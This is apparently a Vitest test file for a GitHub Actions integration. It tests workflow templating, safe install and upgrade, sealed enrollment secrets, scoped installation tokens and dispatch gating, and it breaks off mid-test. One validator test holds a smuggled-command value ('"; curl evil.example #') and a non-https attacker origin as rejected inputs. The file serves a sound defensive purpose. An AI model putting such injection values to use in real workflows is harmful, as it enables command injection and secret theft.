// ONBOARDING O4 — GitHub Actions-hosted execution.
//
// Covers the workflow template, idempotent install/upgrade against a mocked
// Contents API, sealed-box secret encryption, installation-token scoping and
// expiry caching, dispatch (happy path and repository-not-in-installation),
// and a coordinator-level assertion that the Actions path does not weaken the
// existing Phase 4 dispatch gate.
import { generateKeyPairSync } from "node:crypto";
import { mkdtempSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PGlite } from "@electric-sql/pglite";
import { ApprovedRepositoryRegistry } from "@norns/runner";
import sodium from "libsodium-wrappers";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  ActionsEnrollmentService,
  ActionsExecutionCoordinator,
  ActionsExecutionError,
  ActionsExecutionRepository,
} from "../src/coordinator/actionsExecution.js";
import { Phase4Coordinator } from "../src/coordinator/phase4Coordinator.js";
import {
  NORNS_ENROLLMENT_SECRET_NAME,
  NORNS_WORKFLOW_PATH,
  NORNS_WORKFLOW_VERSION,
  inspectCommittedWorkflow,
  nornsRunName,
  renderNornsAgentWorkflow,
} from "../src/integrations/actionsWorkflowTemplate.js";
import {
  GITHUB_TOKEN_SCOPES,
  GitHubIntegrationService,
  githubIntegrationConfigFromEnvironment,
} from "../src/integrations/github.js";
import {
  GitHubActionsService,
  enrollmentTokenHash,
  generateEnrollmentToken,
  sealRepositorySecret,
} from "../src/integrations/githubActions.js";
import { PGliteTransactionRunner } from "../src/persistence/v2/database.js";
import { type V2MigrationDatabase, runCurrentV2Migrations } from "../src/persistence/v2/migrate.js";
import { RelayStores } from "../src/stores.js";

const TEMPLATE = {
  serverOrigin: "https://norns.example",
  runnerPackage: "0.1.0@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
} as const;

const REPOSITORY = {
  installation_id: "5001",
  repository_github_id: 90210,
  owner: "octo",
  name: "widgets",
  default_branch: "main",
} as const;

/** Every PGlite opened by `harness`, closed after each test regardless of outcome. */
const openDatabases: PGlite[] = [];

afterEach(async () => {
  for (const database of openDatabases.splice(0)) {
    if (!database.closed) await database.close();
  }
});

const json = (body: unknown, status = 200): Response =>
  new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });

const noContent = (status = 204): Response => new Response(null, { status });

interface Recorded {
  url: string;
  method: string;
  body: Record<string, unknown> | null;
}

/**
 * Builds a GitHubIntegrationService whose every HTTP call is captured, plus a
 * GitHubActionsService sharing the same transport. `routes` is consulted first;
 * installation-token minting is always handled here so token scoping and
 * caching can be asserted independently of the route under test.
 */
async function harness(
  routes: (request: Recorded) => Response | undefined,
  options: { tokenExpiresInMs?: number } = {},
) {
  const pg = new PGlite();
  // MINOR 8: every database the harness opens is registered for teardown, so
  // an early test failure cannot leak a WASM instance the way per-test
  // success-path closes did.
  openDatabases.push(pg);
  await pg.exec(`
    CREATE ROLE norns_app NOLOGIN;
    CREATE TABLE norns_state (
      key TEXT PRIMARY KEY,
      snapshot JSONB NOT NULL,
      updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
    );
  `);
  await runCurrentV2Migrations(pg as unknown as V2MigrationDatabase);
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const config = githubIntegrationConfigFromEnvironment(
    {
      NORNS_GITHUB_APP_ID: "1234",
      NORNS_GITHUB_CLIENT_ID: "Iv1.test",
      NORNS_GITHUB_CLIENT_SECRET: "client-secret",
      NORNS_GITHUB_APP_SLUG: "the-norns-test",
      NORNS_GITHUB_PRIVATE_KEY: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
      NORNS_GITHUB_STATE_SECRET: "state-secret-that-is-at-least-thirty-two-bytes",
      NORNS_GITHUB_TOKEN_ENCRYPTION_KEY: Buffer.alloc(32, 7).toString("base64"),
    },
    "https://norns.example",
  );
  if (!config) throw new Error("expected GitHub test configuration");

  const requests: Recorded[] = [];
  let mintedTokens = 0;
  const http = vi.fn(async (input: string | URL | Request, init?: RequestInit) => {
    const record: Recorded = {
      url: String(input),
      method: (init?.method ?? "GET").toUpperCase(),
      body: typeof init?.body === "string" ? JSON.parse(init.body) : null,
    };
    requests.push(record);
    if (record.url.endsWith("/access_tokens")) {
      mintedTokens += 1;
      return json({
        token: `installation-token-${mintedTokens}`,
        expires_at: new Date(Date.now() + (options.tokenExpiresInMs ?? 3_600_000)).toISOString(),
      });
    }
    const routed = routes(record);
    if (routed) return routed;
    return json({ message: `unexpected ${record.method} ${record.url}` }, 500);
  });

  const transactions = new PGliteTransactionRunner(pg);
  const github = new GitHubIntegrationService(
    transactions,
    config,
    http as unknown as typeof fetch,
    null,
  );
  const actions = new GitHubActionsService(github, http as unknown as typeof fetch);
  return {
    pg,
    transactions,
    github,
    actions,
    requests,
    tokenRequests: () => requests.filter((entry) => entry.url.endsWith("/access_tokens")),
    mintedTokens: () => mintedTokens,
  };
}

const contentsUrl = `https://api.github.com/repos/octo/widgets/contents/${NORNS_WORKFLOW_PATH}`;

// ---------------------------------------------------------------------------

describe("Norns Actions workflow template", () => {
  it("renders deterministically with the managed and version markers", () => {
    const first = renderNornsAgentWorkflow(TEMPLATE);
    expect(renderNornsAgentWorkflow(TEMPLATE)).toBe(first);
    expect(inspectCommittedWorkflow(first)).toEqual({
      managed: true,
      version: NORNS_WORKFLOW_VERSION,
    });
  });

  it("requests only the minimum permissions the job needs", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    expect(rendered).toContain("permissions:\n  contents: write\n  pull-requests: write\n");
    // Anything broader would be a standing grant inside the user's repository.
    for (const forbidden of ["actions: write", "packages: write", "id-token: write"]) {
      expect(rendered).not.toContain(forbidden);
    }
  });

  it("uses GITHUB_TOKEN for pushes rather than a Norns token broker", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    expect(rendered).toContain("persist-credentials: true");
    expect(rendered).toContain("GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}");
  });

  it("bakes the relay origin in rather than accepting it as a dispatch input", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    expect(rendered).toContain('NORNS_SERVER: "https://norns.example"');
    // If the origin were an input, anyone able to click "Run workflow" could
    // redirect the enrollment secret to a host they control.
    expect(rendered).not.toContain("norns_server:");
  });

  it("reads the enrollment secret from env and never from a command line", () => {
    const rendered = renderNornsAgentWorkflow(TEMPLATE);
    expect(rendered).toContain(
      `NORNS_RUNNER_ENROLLMENT_TOKEN: \${{ secrets.${NORNS_ENROLLMENT_SECRET_NAME} }}`,
    );
    const runStep = rendered.slice(rendered.indexOf("norns-runner start"));
    expect(runStep).not.toContain("ENROLLMENT_TOKEN");
  });

  it("correlates the run back to the Norns dispatch job through run-name", () => {
    expect(renderNornsAgentWorkflow(TEMPLATE)).toContain(
      `run-name: "${nornsRunName("${{ inputs.norns_job_id }}")}"`,
    );
  });

  it("refuses template parameters that could break out of the YAML", () => {
    expect(() =>
      renderNornsAgentWorkflow({ ...TEMPLATE, serverOrigin: "http://evil.example" }),
    ).toThrow(/https origin/);
    expect(() =>
      renderNornsAgentWorkflow({ ...TEMPLATE, runnerPackage: '"; curl evil.example #' }),
    ).toThrow(/unsafe runner tarball/);
    expect(() => renderNornsAgentWorkflow({ ...TEMPLATE, timeoutMinutes: 100_000 })).toThrow(
      /between 1 and 360/,
    );
  });

  it("treats a file without the managed marker as not Norns-owned", () => {
    expect(inspectCommittedWorkflow("name: CI\non: push\n")).toEqual({
      managed: false,
      version: null,
    });
  });
});

// ---------------------------------------------------------------------------

describe("Norns Actions workflow installation", () => {
  it("creates the workflow when the repository has none", async () => {
    const { actions, requests, pg } = await harness((request) => {
      if (request.url.startsWith(contentsUrl) && request.method === "GET") {
        return json({ message: "Not Found" }, 404);
      }
      if (request.url.startsWith(contentsUrl) && request.method === "PUT") {
        return json({ commit: { sha: "commit-created" } }, 201);
      }
      return undefined;
    });
    const result = await actions.installWorkflow(REPOSITORY, TEMPLATE);
    expect(result).toMatchObject({
      action: "created",
      commit_sha: "commit-created",
      blocked_reason: null,
    });
    const put = requests.find((entry) => entry.method === "PUT");
    // A create must not carry a sha — sending one would target a blob that
    // does not exist and fail, or worse, target the wrong one.
    expect(put?.body).not.toHaveProperty("sha");
    expect(put?.body?.branch).toBe("main");
  });

  it("is idempotent: an identical committed file produces no commit", async () => {
    const existing = Buffer.from(renderNornsAgentWorkflow(TEMPLATE), "utf8").toString("base64");
    const { actions, requests, pg } = await harness((request) => {
      if (request.url.startsWith(contentsUrl) && request.method === "GET") {
        return json({ type: "file", sha: "blob-1", encoding: "base64", content: existing });
      }
      return undefined;
    });
    const result = await actions.installWorkflow(REPOSITORY, TEMPLATE);
    expect(result.action).toBe("unchanged");
    expect(result.commit_sha).toBeNull();
    expect(requests.some((entry) => entry.method === "PUT")).toBe(false);
  });

  it("upgrades an older Norns-managed workflow in place, passing the blob sha", async () => {
    const stale = Buffer.from(
      "# norns:managed=true\n# norns:workflow-version=0\nname: Norns Agent\n",
      "utf8",
    ).toString("base64");
    const { actions, requests, pg } = await harness((request) => {
      if (request.url.startsWith(contentsUrl) && request.method === "GET") {
        return json({ type: "file", sha: "blob-stale", encoding: "base64", content: stale });
      }
      if (request.url.startsWith(contentsUrl) && request.method === "PUT") {
        return json({ commit: { sha: "commit-upgraded" } });
      }
      return undefined;
    });
    const result = await actions.installWorkflow(REPOSITORY, TEMPLATE);
    expect(result).toMatchObject({ action: "updated", commit_sha: "commit-upgraded" });
    const put = requests.find((entry) => entry.method === "PUT");
    expect(put?.body?.sha).toBe("blob-stale");
    expect(Buffer.from(String(put?.body?.content), "base64").toString("utf8")).toBe(
      renderNornsAgentWorkflow(TEMPLATE),
    );
  });

  it("never clobbers a workflow Norns did not write", async () => {
    const theirs = Buffer.from(
      "name: Deploy to production\non: push\njobs: { deploy: { runs-on: ubuntu-latest } }\n",
      "utf8",
    ).toString("base64");
    const { actions, requests, pg } = await harness((request) => {
      if (request.url.startsWith(contentsUrl) && request.method === "GET") {
        return json({ type: "file", sha: "blob-theirs", encoding: "base64", content: theirs });
      }
      return undefined;
    });
    const result = await actions.installWorkflow(REPOSITORY, TEMPLATE);
    expect(result.action).toBe("blocked");
    expect(result.blocked_reason).toMatch(/Norns did not create/);
    expect(requests.some((entry) => entry.method === "PUT")).toBe(false);
  });

  it("refuses to downgrade a workflow written by a newer Norns", async () => {
    const newer = Buffer.from(
      `# norns:managed=true\n# norns:workflow-version=${NORNS_WORKFLOW_VERSION + 5}\n`,
      "utf8",
    ).toString("base64");
    const { actions, requests, pg } = await harness((request) => {
      if (request.url.startsWith(contentsUrl) && request.method === "GET") {
        return json({ type: "file", sha: "blob-newer", encoding: "base64", content: newer });
      }
      return undefined;
    });
    const result = await actions.installWorkflow(REPOSITORY, TEMPLATE);
    expect(result.action).toBe("blocked");
    expect(result.blocked_reason).toMatch(/newer than this Norns deployment/);
    expect(requests.some((entry) => entry.method === "PUT")).toBe(false);
  });

  it("scopes the workflow-commit token to this repository with workflows:write", async () => {
    const { actions, tokenRequests, pg } = await harness((request) => {
      if (request.url.startsWith(contentsUrl) && request.method === "GET") {
        return json({ message: "Not Found" }, 404);
      }
      if (request.url.startsWith(contentsUrl) && request.method === "PUT") {
        return json({ commit: { sha: "c" } }, 201);
      }
      return undefined;
    });
    await actions.installWorkflow(REPOSITORY, TEMPLATE);
    expect(tokenRequests()[0]?.body).toEqual({
      repository_ids: [REPOSITORY.repository_github_id],
      permissions: { contents: "write", workflows: "write" },
    });
  });
});

// ---------------------------------------------------------------------------

describe("Norns runner enrollment secret", () => {
  it("round-trips through a libsodium sealed box only the repository can open", async () => {
    await sodium.ready;
    const keypair = sodium.crypto_box_keypair();
    const secret = generateEnrollmentToken();
    const sealed = await sealRepositorySecret(
      sodium.to_base64(keypair.publicKey, sodium.base64_variants.ORIGINAL),
      secret,
    );
    const opened = sodium.crypto_box_seal_open(
      sodium.from_base64(sealed, sodium.base64_variants.ORIGINAL),
      keypair.publicKey,
      keypair.privateKey,
    );
    expect(sodium.to_string(opened)).toBe(secret);
    // Sealed boxes are anonymous and randomised: the same plaintext must not
    // produce the same ciphertext twice.
    const again = await sealRepositorySecret(
      sodium.to_base64(keypair.publicKey, sodium.base64_variants.ORIGINAL),
      secret,
    );
    expect(again).not.toBe(sealed);
  });

  it("PUTs the sealed value and the key id, never the plaintext", async () => {
    await sodium.ready;
    const keypair = sodium.crypto_box_keypair();
    const publicKeyBase64 = sodium.to_base64(keypair.publicKey, sodium.base64_variants.ORIGINAL);
    const secretsBase = "https://api.github.com/repos/octo/widgets/actions/secrets";
    const { actions, requests, tokenRequests, pg } = await harness((request) => {
      if (request.url === `${secretsBase}/public-key`) {
        return json({ key_id: "key-1", key: publicKeyBase64 });
      }
      if (request.url === `${secretsBase}/${NORNS_ENROLLMENT_SECRET_NAME}`) return noContent();
      return undefined;
    });
    const token = generateEnrollmentToken();
    await actions.putEnrollmentSecret(REPOSITORY, token);

    const put = requests.find((entry) => entry.method === "PUT");
    expect(put?.body?.key_id).toBe("key-1");
    expect(String(put?.body?.encrypted_value)).not.toContain(token);
    expect(
      sodium.to_string(
        sodium.crypto_box_seal_open(
          sodium.from_base64(String(put?.body?.encrypted_value), sodium.base64_variants.ORIGINAL),
          keypair.publicKey,
          keypair.privateKey,
        ),
      ),
    ).toBe(token);
    // Repository-scoped, secrets-only.
    expect(tokenRequests()[0]?.body).toEqual({
      repository_ids: [REPOSITORY.repository_github_id],
      permissions: { secrets: "write" },
    });
  });

  it("stores only a hash, and the hash is stable and not the token", () => {
    const token = generateEnrollmentToken();
    expect(enrollmentTokenHash(token)).toBe(enrollmentTokenHash(token));
    expect(enrollmentTokenHash(token)).not.toContain(token);
    expect(enrollmentTokenHash(token)).toHaveLength(64);
  });
});

// ---------------------------------------------------------------------------

describe("installation token scoping and expiry caching", () => {
  it("reuses a cached token for the same scope instead of re-minting", async () => {
    const { github, mintedTokens, pg } = await harness(() => undefined);
    const scope = { repository_ids: [42], permissions: { contents: "write" } } as const;
    const first = await github.installationToken("5001", scope);
    const second = await github.installationToken("5001", scope);
    expect(second).toBe(first);
    expect(mintedTokens()).toBe(1);
  });

  it("mints separately for different scopes and different installations", async () => {
    const { github, mintedTokens, pg } = await harness(() => undefined);
    await github.installationToken("5001", {
      repository_ids: [42],
      permissions: { actions: "write" },
    });
    await github.installationToken("5001", {
      repository_ids: [43],
      permissions: { actions: "write" },
    });
    await github.installationToken("5001", {
      repository_ids: [42],
      permissions: { contents: "write" },
    });
    await github.installationToken("5002", {
      repository_ids: [42],
      permissions: { actions: "write" },
    });
    expect(mintedTokens()).toBe(4);
  });

  it("re-mints once GitHub's expires_at is inside the refresh margin", async () => {
    // Expiry inside the 120s margin: the cached token must not be reused.
    const { github, mintedTokens, pg } = await harness(() => undefined, {
      tokenExpiresInMs: 30_000,
    });
    const scope = { repository_ids: [42], permissions: { contents: "write" } } as const;
    const first = await github.installationToken("5001", scope);
    const second = await github.installationToken("5001", scope);
    expect(second).not.toBe(first);
    expect(mintedTokens()).toBe(2);
  });

  it("drops cached tokens on revocation", async () => {
    const { github, mintedTokens, pg } = await harness(() => undefined);
    const scope = { repository_ids: [42], permissions: { contents: "write" } } as const;
    await github.installationToken("5001", scope);
    github.forgetInstallationTokens("5001");
    await github.installationToken("5001", scope);
    expect(mintedTokens()).toBe(2);
  });

  it("never mints with an empty body (the pre-O4 full-permission default)", async () => {
    const { github, tokenRequests, pg } = await harness(() => undefined);
    await github.installationToken("5001", {
      repository_ids: [42],
      permissions: { contents: "write" },
    });
    const body = tokenRequests()[0]?.body ?? {};
    expect(Object.keys(body).sort()).toEqual(["permissions", "repository_ids"]);
  });
});

// ---------------------------------------------------------------------------

describe("workflow dispatch", () => {
  const dispatchUrl =
    "https://api.github.com/repos/octo/widgets/actions/workflows/norns-agent.yml/dispatches";

  it("dispatches with the Norns job inputs and an actions:write repository token", async () => {
    const { actions, requests, tokenRequests, pg } = await harness((request) =>
      request.url === dispatchUrl ? noContent() : undefined,
    );
    await actions.dispatchWorkflow(REPOSITORY, {
      norns_job_id: "dispatch-job:run:task-1:1",
      norns_runner_id: "actions:project-1",
      norns_run_id: "run:task-1:1",
    });
    const dispatch = requests.find((entry) => entry.url === dispatchUrl);
    expect(dispatch?.method).toBe("POST");
    expect(dispatch?.body).toEqual({
      ref: "main",
      inputs: {
        norns_job_id: "dispatch-job:run:task-1:1",
        norns_runner_id: "actions:project-1",
        norns_run_id: "run:task-1:1",
      },
    });
    expect(tokenRequests()[0]?.body).toEqual({
      repository_ids: [REPOSITORY.repository_github_id],
      permissions: { actions: "write" },
    });
  });

  it("correlates the resulting run through the job id in the run name", async () => {
    const runsUrl =
      "https://api.github.com/repos/octo/widgets/actions/workflows/norns-agent.yml/runs";
    const { actions, pg } = await harness((request) =>
      request.url.startsWith(runsUrl)
        ? json({
            workflow_runs: [
              {
                id: 11,
                display_title: nornsRunName("some-other-job"),
                status: "completed",
                conclusion: "success",
                html_url: "https://github.com/octo/widgets/actions/runs/11",
                run_number: 1,
                created_at: "2026-07-21T10:00:00Z",
              },
              {
                id: 12,
                display_title: nornsRunName("dispatch-job:run:task-1:1"),
                status: "in_progress",
                conclusion: null,
                html_url: "https://github.com/octo/widgets/actions/runs/12",
                run_number: 2,
                created_at: "2026-07-21T10:05:00Z",
              },
            ],
          })
        : undefined,
    );
    const found = await actions.findRunForJob(REPOSITORY, "dispatch-job:run:task-1:1");
    expect(found?.github_run_id).toBe(12);
    expect(found?.status).toBe("in_progress");
    expect(await actions.findRunForJob(REPOSITORY, "dispatch-job:absent")).toBeNull();
  });

  it("surfaces a repository that is not in the installation instead of failing silently", async () => {
    // A "selected repositories" installation that does not include this repo
    // answers 404 on dispatch. That must become a visible, explained failure.
    const { actions, pg } = await harness((request) =>
      request.url === dispatchUrl ? json({ message: "Not Found" }, 404) : undefined,
    );
    await expect(
      actions.dispatchWorkflow(REPOSITORY, {
        norns_job_id: "dispatch-job:x",
        norns_runner_id: "actions:project-1",
        norns_run_id: "run:x",
      }),
    ).rejects.toMatchObject({ code: "github_actions_api_error", status: 404 });
  });
});

// ---------------------------------------------------------------------------

describe("installation readiness replaces the inert binding_ready flag", () => {
  const repoUrl = "https://api.github.com/repos/octo/widgets";

  async function seedConnection(pg: PGlite, selection: "all" | "selected") {
    await pg.exec(`
      INSERT INTO service_connections (
        id, provider, display_name, base_url, status, owner_type, owner_login,
        external_account_id, installation_id, repository_selection,
        connected_by_user_id, last_validated_at, created_at, updated_at
      ) VALUES ('github:5001','github','octo on GitHub','https://github.com','connected',
        'organization','octo','777','5001','${selection}','user-1',now(),now(),now());
    `);
  }

  it("reports ready when GitHub says the repository is reachable", async () => {
    const { github, pg } = await harness((request) =>
      request.url === repoUrl ? json({ id: 90210, name: "widgets" }) : undefined,
    );
    await seedConnection(pg, "all");
    const readiness = await github.installationReadiness("github:5001", "octo", "widgets");
    expect(readiness.ready).toBe(true);
    expect(readiness.action_required).toBeNull();
  });

  it("reports an actionable, linked state when the repository is not in the installation", async () => {
    const { github, pg } = await harness((request) =>
      request.url === repoUrl ? json({ message: "Not Found" }, 404) : undefined,
    );
    await seedConnection(pg, "selected");
    const readiness = await github.installationReadiness("github:5001", "octo", "widgets");
    expect(readiness).toMatchObject({
      ready: false,
      reason: "repository_not_in_installation",
      repository_selection: "selected",
    });
    expect(readiness.action_required).toMatch(/Repository access/);
    expect(readiness.manage_installation_url).toContain("/settings/installations/5001");
  });

  it("probes with an installation-wide metadata:read token, not a repo-scoped one", async () => {
    // Scoping the probe to a repository the installation cannot see would 422
    // at mint time and turn a clear answer into an opaque error.
    const { github, tokenRequests, pg } = await harness((request) =>
      request.url === repoUrl ? json({ message: "Not Found" }, 404) : undefined,
    );
    await seedConnection(pg, "selected");
    await github.installationReadiness("github:5001", "octo", "widgets");
    expect(tokenRequests()[0]?.body).toEqual({ permissions: { metadata: "read" } });
  });
});

// ---------------------------------------------------------------------------

describe("Actions-hosted scheduling extends the Phase 4 gate", () => {
  let pg: PGlite;
  let transactions: PGliteTransactionRunner;
  let repository: ActionsExecutionRepository;
  let stores: RelayStores;
  let dispatched: { inputs: Record<string, string> }[];

  const contents = `https://api.github.com/repos/octo/widgets/contents/${NORNS_WORKFLOW_PATH}`;
  const secretsBase = "https://api.github.com/repos/octo/widgets/actions/secrets";
  const dispatchUrl =
    "https://api.github.com/repos/octo/widgets/actions/workflows/norns-agent.yml/dispatches";

  /** Seeds the same fixture phase4Coordinator.test.ts uses, as a github binding. */
  async function seed(bindingStatus: string) {
    await pg.exec(`
      INSERT INTO projects (
        id, name, description, status, assignment_policy_ref,
        verification_policy_ref, budget_policy_ref
      ) VALUES ('project-1','Project One','','active','assignment','verification','budget');
      INSERT INTO repository_bindings (
        id, project_id, binding_type, status, runner_id, repository_id,
        repository_display_name, github_installation_id, github_owner, github_name,
        granted_permissions, default_branch, observed_head, verification_policy_ref,
        repository_health, created_by_actor_type, created_by_actor_id
      ) VALUES ('binding-1','project-1','github','${bindingStatus}','actions:project-1',
        '90210','octo/widgets','5001','octo','widgets','{}'::jsonb,'main','commit-1',
        'verification','healthy','human','admin-1');
      UPDATE projects SET primary_repository_binding_id = 'binding-1' WHERE id = 'project-1';
      INSERT INTO phases (
        id, project_id, objective_summary, priority, status, approved_budget_usd
      ) VALUES ('phase-1','project-1','Implement vertical slice',1,'awaiting_approval',20);
      INSERT INTO objectives (
        id, project_id, phase_id, outcome, success_measures, status, "order"
      ) VALUES ('objective-1','project-1','phase-1','One completed task',
        '["task completes"]'::jsonb,'active',0);
      INSERT INTO strategy_versions (
        id, project_id, phase_id, version, status, objective, content,
        convergence, review_rounds, content_hash
      ) VALUES ('strategy-1','project-1','phase-1',1,'approved','Vertical slice',
        '{}'::jsonb,'converged',1,repeat('a',64));
      UPDATE phases SET status='approved', approved_strategy_version_id='strategy-1'
        WHERE id='phase-1';
      INSERT INTO tasks (
        id, project_id, phase_id, objective_id, strategy_version_id, title,
        description, deliverables, acceptance_criteria, complexity, risk,
        required_roles, required_capabilities, required_inputs, expected_outputs,
        environment_policy_ref, verification_policy_ref, state, lifecycle_version
      ) VALUES ('task-1','project-1','phase-1','objective-1','strategy-1','Do work',
        'Complete the vertical slice','["change"]'::jsonb,'["verified"]'::jsonb,
        'M','medium','["implementation"]'::jsonb,'[]'::jsonb,'[]'::jsonb,
        '["commit"]'::jsonb,'environment','verification','pending',0);
      INSERT INTO agent_profiles (
        id, provider, runtime, model, roles, capabilities, context_limit_tokens,
        security_restrictions, status, active_workload, cost_metadata
      ) VALUES ('agent-1','openai','codex','gpt-5-codex','["implementation"]'::jsonb,
        '["typescript"]'::jsonb,200000,'[]'::jsonb,'available',0,
        '{"billing_mode":"subscription"}'::jsonb);
      INSERT INTO agent_assignments (
        id, project_id, phase_id, task_id, agent_profile_id, status, rationale,
        rationale_factors, budget_limit_usd, allocation_policy_ref
      ) VALUES ('assignment-1','project-1','phase-1','task-1','agent-1','proposed',
        'Best implementation agent','["capability"]'::jsonb,10,'allocation');
    `);
    // Deliberately does NOT create a github_actions_execution_bindings row:
    // the coordinator must project one from the project's own GitHub binding.
  }

  async function build() {
    const built = await harness((request) => {
      if (request.url.startsWith(contents) && request.method === "GET") {
        return json({ message: "Not Found" }, 404);
      }
      if (request.url.startsWith(contents) && request.method === "PUT") {
        return json({ commit: { sha: "commit-1" } }, 201);
      }
      if (request.url === `${secretsBase}/public-key`) {
        return json({ key_id: "key-1", key: publicKeyBase64 });
      }
      if (request.url === `${secretsBase}/${NORNS_ENROLLMENT_SECRET_NAME}`) return noContent();
      if (request.url === dispatchUrl) {
        dispatched.push({ inputs: (request.body?.inputs ?? {}) as Record<string, string> });
        return noContent();
      }
      if (request.url.includes("/actions/workflows/norns-agent.yml/runs")) {
        return json({
          workflow_runs: [
            {
              id: 99,
              display_title: nornsRunName(dispatched.at(-1)?.inputs.norns_job_id ?? ""),
              status: "queued",
              conclusion: null,
              html_url: "https://github.com/octo/widgets/actions/runs/99",
              run_number: 1,
              created_at: "2026-07-21T10:00:00Z",
            },
          ],
        });
      }
      return undefined;
    });
    pg = built.pg;
    transactions = built.transactions;
    repository = new ActionsExecutionRepository(transactions);
    const coordinator = new ActionsExecutionCoordinator(
      new Phase4Coordinator(transactions),
      repository,
      built.actions,
      {
        serverOrigin: "https://norns.example",
        runnerPackage: "0.1.0@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        reserveGeneration: (runnerId) => stores.reserveRunnerGeneration(runnerId),
      },
    );
    return { coordinator, repository };
  }

  let publicKeyBase64: string;

  beforeEach(async () => {
    await sodium.ready;
    publicKeyBase64 = sodium.to_base64(
      sodium.crypto_box_keypair().publicKey,
      sodium.base64_variants.ORIGINAL,
    );
    stores = new RelayStores();
    dispatched = [];
  });

  const scheduleInput = {
    project_id: "project-1",
    phase_id: "phase-1",
    task_id: "task-1",
    assignment_id: "assignment-1",
    authorized_by: { actor_type: "human" as const, actor_id: "admin-1" },
    authorized_by_session_id: "session-1",
    correlation_id: "correlation-1",
    causation_id: null,
    context_refs: [
      {
        artifact_id: "prompt-1",
        content_hash: "b".repeat(64),
        byte_size: 12,
        storage_ref: "relay://artifacts/prompt-1",
      },
    ],
    target_branch: "norns/task-1",
    worktree_policy_ref: "worktree-default",
    sandbox_policy_ref: "sandbox-default",
    max_input_tokens: 10_000,
    max_output_tokens: 4_000,
    max_duration_seconds: 900,
    issued_at: "2026-07-21T20:00:00.000Z",
    expires_at: "2026-07-21T20:15:00.000Z",
  };

  it("dispatches an Actions-hosted run for a connected binding", async () => {
    const { coordinator } = await build();
    await seed("connected");
    const scheduled = await coordinator.schedule(scheduleInput);

    expect(scheduled.run_id).toBe("run:task-1:1");
    // The runner identity is project-scoped and server-chosen, never a laptop.
    expect(scheduled.command.runner_id).toBe("actions:project-1");
    expect(scheduled.actions.runner_id).toBe("actions:project-1");
    expect(scheduled.actions.workflow.action).toBe("created");
    expect(scheduled.actions.github_run_url).toBe(
      "https://github.com/octo/widgets/actions/runs/99",
    );
    // The command carries the generation the job will later prove it owns.
    expect(scheduled.command.runner_generation).toBe(scheduled.actions.runner_generation);
    expect(stores.runner("actions:project-1")?.generation).toBe(
      scheduled.actions.runner_generation,
    );
    // Reserved identities cannot authenticate until enrollment supplies a key.
    expect(stores.runner("actions:project-1")?.public_key_pem).toBe("");
    expect(dispatched[0]?.inputs.norns_job_id).toBe(scheduled.dispatch_job_id);
  });

  it("does NOT weaken the gate: an unconnected binding is still refused", async () => {
    const { coordinator } = await build();
    await seed("unverified_candidate");
    await expect(coordinator.schedule(scheduleInput)).rejects.toThrow(
      /execution requires a verified repository binding/,
    );
    // And nothing was launched in the user's repository.
    expect(dispatched).toHaveLength(0);
  });

  it("refuses before touching GitHub when Actions execution is not configured", async () => {
    const { coordinator } = await build();
    await seed("connected");
    // Detach the project's primary binding so nothing is projectable, and
    // clear any row a previous projection left behind.
    await pg.exec(`
      UPDATE projects SET primary_repository_binding_id = NULL WHERE id = 'project-1';
      DELETE FROM github_actions_execution_bindings;
    `);
    await expect(coordinator.schedule(scheduleInput)).rejects.toMatchObject({
      code: "actions_execution_not_configured",
    });
  });

  it("refuses when Actions execution is disabled for the binding", async () => {
    const { coordinator, repository: repo } = await build();
    await seed("connected");
    // Project the binding first, then disable it: setEnabled targets a row.
    await repo.ensureBindingForProject("project-1");
    await repo.setEnabled("binding-1", false);
    await expect(coordinator.schedule(scheduleInput)).rejects.toMatchObject({
      code: "actions_execution_disabled",
    });
    expect(dispatched).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------

describe("ephemeral runner enrollment", () => {
  let pg: PGlite;
  let repository: ActionsExecutionRepository;
  let stores: RelayStores;
  let enrollment: ActionsEnrollmentService;
  const token = generateEnrollmentToken();
  const publicKeyPem = generateKeyPairSync("ed25519")
    .publicKey.export({ type: "spki", format: "pem" })
    .toString();

  beforeEach(async () => {
    const built = await harness(() => undefined);
    pg = built.pg;
    repository = new ActionsExecutionRepository(built.transactions);
    stores = new RelayStores();
    enrollment = new ActionsEnrollmentService(repository, (runnerId, pem, generation) =>
      stores.enrollRunnerAtGeneration(runnerId, pem, generation),
    );
    await pg.exec(`
      INSERT INTO projects (
        id, name, description, status, assignment_policy_ref,
        verification_policy_ref, budget_policy_ref
      ) VALUES ('project-1','Project One','','active','a','v','b');
      INSERT INTO repository_bindings (
        id, project_id, binding_type, status, runner_id, repository_id,
        repository_display_name, github_installation_id, github_owner, github_name,
        granted_permissions, default_branch, verification_policy_ref,
        repository_health, created_by_actor_type, created_by_actor_id
      ) VALUES ('binding-1','project-1','github','connected','actions:project-1','90210',
        'octo/widgets','5001','octo','widgets','{}'::jsonb,'main','v','healthy','human','admin-1');
    `);
    await repository.upsertBinding({
      repository_binding_id: "binding-1",
      project_id: "project-1",
      connection_id: "github:5001",
      installation_id: "5001",
      repository_github_id: 90210,
      owner: "octo",
      name: "widgets",
      default_branch: "main",
    });
    await repository.storeEnrollmentSecretHash("binding-1", enrollmentTokenHash(token));
    const generation = stores.reserveRunnerGeneration("actions:project-1");
    await repository.createRun({
      project_id: "project-1",
      repository_binding_id: "binding-1",
      dispatch_job_id: "dispatch-job:run:task-1:1",
      run_id: "run:task-1:1",
      runner_id: "actions:project-1",
      runner_generation: generation,
    });
    await repository.markDispatched("dispatch-job:run:task-1:1", { id: 99, url: "https://x" });
  });

  const redeem = (overrides: Record<string, string> = {}) =>
    enrollment.redeem({
      enrollment_token: token,
      runner_id: "actions:project-1",
      dispatch_job_id: "dispatch-job:run:task-1:1",
      public_key_pem: publicKeyPem,
